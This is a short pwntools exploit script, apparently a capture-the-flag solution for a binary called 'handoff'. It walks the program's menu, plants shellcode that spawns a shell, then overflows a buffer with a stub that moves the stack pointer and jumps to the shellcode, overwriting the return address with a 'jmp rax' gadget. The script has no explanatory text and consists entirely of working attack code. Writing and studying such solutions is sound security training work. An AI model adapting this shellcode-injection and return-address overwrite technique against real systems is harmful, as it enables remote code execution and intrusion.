from pwn import *

context.binary=ELF("./handoff")
p = process('./handoff')
gdb.attach(p)

p.recvuntil('the app')
p.sendline(b'1')

p.recvuntil('name:')
p.sendline(b'hacker')

p.recvuntil('the app')
p.sendline(b'2')

p.recvuntil('to?')
p.sendline(b'0')

p.recvuntil('them?')

shell= asm(shellcraft.sh())

p.sendline(shell)

jmp_rax = 0x40116c

p.recvuntil('the app')
           
p.sendline(b'3')

p.recvuntil('appreciate it:')

payload = asm("nop;sub rsp,0x2e8; jmp rsp;") #len=10

payload+=asm("nop")*10 #nop slides to fill the buffer
payload+=p64(jmp_rax) #overwrite rip

p.sendline(payload)

p.interactive()



